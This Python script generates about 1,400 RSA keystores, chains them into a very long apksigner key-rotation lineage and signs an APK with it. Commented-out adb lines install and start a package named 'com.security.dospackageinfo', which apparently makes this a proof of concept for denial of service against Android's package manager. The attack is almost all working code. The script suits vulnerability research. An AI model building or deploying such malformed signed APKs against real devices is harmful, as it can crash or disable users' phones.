#!/usr/bin/env python
import os
import subprocess
from multiprocessing import get_context

def gen_keystore(i):
    cmd=f"yes |keytool -genkeypair -keystore {str(i).rjust(4,'0')}.keystore -alias {str(i).rjust(4,'0')} -keyalg RSA -keysize 2048 -storepass android -validity 10000"
    print(cmd)
    subprocess.run(cmd, shell=True, env=os.environ, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def exec(cmd):
    print(cmd)
    os.system(cmd)

if __name__ == '__main__':
    # with get_context("spawn").Pool() as p:
    #     for i in range(1410):
    #         if(os.path.isfile(f"{str(i).rjust(4,'0')}.keystore")):
    #             continue
    #         p.apply_async(gen_keystore, args=(i,))
    #     p.close()
    #     p.join()


    exec('rm linechain')
    cmd = 'apksigner rotate -verbose --out linechain --old-signer --ks 0000.keystore --ks-pass pass:android --ks-key-alias 0000 --key-pass pass:android --new-signer --ks 0001.keystore --ks-pass pass:android --ks-key-alias 0001 --key-pass pass:android'
    exec(cmd)
    for i in range(1,1409):
        cmd = f'''apksigner rotate -verbose --in linechain --out linechain --old-signer --ks {str(i).rjust(4,'0')}.keystore --ks-pass pass:android --ks-key-alias {str(i).rjust(4,'0')} --key-pass pass:android --new-signer --ks {str(i+1).rjust(4,'0')}.keystore --ks-pass pass:android --ks-key-alias {str(i+1).rjust(4,'0')} --key-pass pass:android'''
        exec(cmd)
        cmd2 = f'''apksigner sign -verbose --ks 0000.keystore --ks-pass pass:android --ks-key-alias 0000 --key-pass pass:android --next-signer --ks {str(i+1).rjust(4,'0')}.keystore --ks-pass pass:android --ks-key-alias {str(i+1).rjust(4,'0')} --key-pass pass:android --lineage linechain --v1-signing-enabled true --v2-signing-enabled true --v3-signing-enabled true --in app-debug.apk --out app-signed.apk'''

    # cmd2 = 'apksigner sign -verbose --ks 0000.keystore --ks-pass pass:android --ks-key-alias 0000 --key-pass pass:android --next-signer --ks 1409.keystore --ks-pass pass:android --ks-key-alias 1409 --key-pass pass:android --lineage linechain --v1-signing-enabled true --v2-signing-enabled true --v3-signing-enabled true --in app-debug.apk --out app-signed.apk'
    exec(cmd2)

    # exec('adb shell pm uninstall com.security.dospackageinfo')
    # exec('adb install app-signed.apk')
    # exec('adb shell am start -D -n  com.security.dospackageinfo/.MainActivity')
    
    # apksigner verify --print-certs new.apk

        